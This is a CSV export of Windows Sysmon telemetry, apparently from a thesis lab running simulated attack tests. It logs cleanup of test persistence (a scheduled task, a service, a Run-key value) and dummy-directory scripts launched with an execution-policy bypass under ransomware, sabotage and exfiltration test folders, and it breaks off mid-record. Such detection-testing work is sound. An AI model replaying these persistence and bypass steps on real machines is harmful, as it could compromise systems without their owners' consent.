_ts,ID,Timestamp,EventData,ClientId
1783860377186,3,2026-07-12T12:44:50.6741462Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:45:02.938"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50624"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860377186,3,2026-07-12T12:44:50.9430815Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:45:02.946"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50625"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860377186,3,2026-07-12T12:45:41.9093441Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:45:53.643"",
 ""ProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ProcessId"": 12104,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""true"",
 ""SourceIsIpv6"": ""false"",
 ""SourceIp"": ""192.168.1.143"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50627"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""false"",
 ""DestinationIp"": ""192.168.1.129"",
 ""DestinationHostname"": ""-"",
 ""DestinationPort"": ""8088"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860377186,1,2026-07-12T12:45:50.1219652Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:45:56.121"",
 ""ProcessGuid"": ""{6bc49a7d-8c84-6a53-6705-000000009a01}"",
 ""ProcessId"": 1752,
 ""Image"": ""C:\\Windows\\System32\\svchost.exe"",
 ""FileVersion"": ""10.0.19041.1806 (WinBuild.160101.0800)"",
 ""Description"": ""Host Process for Windows Services"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""svchost.exe"",
 ""CommandLine"": ""C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s NetSetupSvc"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""NT AUTHORITY\\SYSTEM"",
 ""LogonGuid"": ""{6bc49a7d-7991-6a53-e703-000000000000}"",
 ""LogonId"": ""0x3E7"",
 ""TerminalSessionId"": ""0"",
 ""IntegrityLevel"": ""System"",
 ""Hashes"": ""MD5=B7F884C1B74A263F746EE12A5F7C9F6A,SHA256=ADD683A6910ABBBF0E28B557FAD0BA998166394932AE2ACA069D9AA19EA8FE88,IMPHASH=247B9220E5D9B720A82B2C8B5069AD69"",
 ""ParentProcessGuid"": ""{6bc49a7d-7991-6a53-0b00-000000009a01}"",
 ""ParentProcessId"": ""772"",
 ""ParentImage"": ""C:\\Windows\\System32\\services.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\services.exe"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783860377186,3,2026-07-12T12:45:53.8750104Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:46:06.000"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50629"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860377186,3,2026-07-12T12:45:53.875031Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:46:06.008"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50630"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.7732237Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.753"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6805-000000009a01}"",
 ""ProcessId"": 11468,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /delete /tn \""TFM-TEC-003\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.8011317Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.764"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6905-000000009a01}"",
 ""ProcessId"": 10584,
 ""Image"": ""C:\\Windows\\System32\\schtasks.exe"",
 ""FileVersion"": ""10.0.19041.1503 (WinBuild.160101.0800)"",
 ""Description"": ""Task Scheduler Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""schtasks.exe"",
 ""CommandLine"": ""schtasks.exe  /delete /tn \""TFM-TEC-003\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=76CD6626DD8834BD4A42E6A565104DC2,SHA256=013C013E0EFD13C9380FAD58418B7ACA8356E591A5CCEFFDB910F7D8B0AD28EF,IMPHASH=ECCE05491F2E8F279F4790BCB1318C05"",
 ""ParentProcessGuid"": ""{6bc49a7d-8c98-6a53-6805-000000009a01}"",
 ""ParentProcessId"": ""11468"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c schtasks.exe /delete /tn \""TFM-TEC-003\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.8931999Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.819"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6a05-000000009a01}"",
 ""ProcessId"": 10144,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c sc.exe delete \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.9227257Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.834"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6b05-000000009a01}"",
 ""ProcessId"": 10204,
 ""Image"": ""C:\\Windows\\System32\\sc.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Service Control Manager Configuration Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""sc.exe"",
 ""CommandLine"": ""sc.exe  delete \""TFM TEC005 Test Service\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=3FB5CF71F7E7EB49790CB0E663434D80,SHA256=41F067C3A11B02FE39947F9EBA68AE5C7CB5BD1872A6009A4CD1506554A9ABA9,IMPHASH=803254E010814E69947095A2725B2AFD"",
 ""ParentProcessGuid"": ""{6bc49a7d-8c98-6a53-6a05-000000009a01}"",
 ""ParentProcessId"": ""10144"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c sc.exe delete \""TFM TEC005 Test Service\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:27.9945143Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.875"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6c05-000000009a01}"",
 ""ProcessId"": 10200,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c reg.exe delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:28.0249892Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.888"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6d05-000000009a01}"",
 ""ProcessId"": 2544,
 ""Image"": ""C:\\Windows\\System32\\reg.exe"",
 ""FileVersion"": ""10.0.19041.1 (WinBuild.160101.0800)"",
 ""Description"": ""Registry Console Tool"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""reg.exe"",
 ""CommandLine"": ""reg.exe  delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=227F63E1D9008B36BDBCC4B397780BE4,SHA256=C0E25B1F9B22DE445298C1E96DDFCEAD265CA030FA6626F61A4A4786CC4A3B7D,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC"",
 ""ParentProcessGuid"": ""{6bc49a7d-8c98-6a53-6c05-000000009a01}"",
 ""ParentProcessId"": ""10200"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c reg.exe delete \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""TFM_T1547_001_test\"" /f"",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:28.1071805Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.937"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6e05-000000009a01}"",
 ""ProcessId"": 3896,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:28.1388375Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:16.949"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6f05-000000009a01}"",
 ""ProcessId"": 12052,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8c98-6a53-6e05-000000009a01}"",
 ""ParentProcessId"": ""3896"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:46:28.2850396Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:17.033"",
 ""ProcessGuid"": ""{6bc49a7d-8c98-6a53-6f05-000000009a01}"",
 ""ProcessId"": 12052,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_lqsqazup.u45.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:17.033"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:43.2490318Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:25.763"",
 ""ProcessGuid"": ""{6bc49a7d-8ca1-6a53-7105-000000009a01}"",
 ""ProcessId"": 12020,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:43.301643Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:25.788"",
 ""ProcessGuid"": ""{6bc49a7d-8ca1-6a53-7205-000000009a01}"",
 ""ProcessId"": 9672,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8ca1-6a53-7105-000000009a01}"",
 ""ParentProcessId"": ""12020"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-008_Sabotaje\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:46:43.5410875Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:25.937"",
 ""ProcessGuid"": ""{6bc49a7d-8ca1-6a53-7205-000000009a01}"",
 ""ProcessId"": 9672,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xvt4lbtj.suz.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:25.937"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:57.8513086Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:35.661"",
 ""ProcessGuid"": ""{6bc49a7d-8cab-6a53-7305-000000009a01}"",
 ""ProcessId"": 11536,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:46:57.9523094Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:35.702"",
 ""ProcessGuid"": ""{6bc49a7d-8cab-6a53-7405-000000009a01}"",
 ""ProcessId"": 6976,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8cab-6a53-7305-000000009a01}"",
 ""ParentProcessId"": ""11536"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-009_Exfiltracion\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:46:58.3447916Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:46:36.012"",
 ""ProcessGuid"": ""{6bc49a7d-8cab-6a53-7405-000000009a01}"",
 ""ProcessId"": 6976,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_4e0g4epi.m14.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:46:36.012"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,3,2026-07-12T12:47:08.4954813Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:47:20.562"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
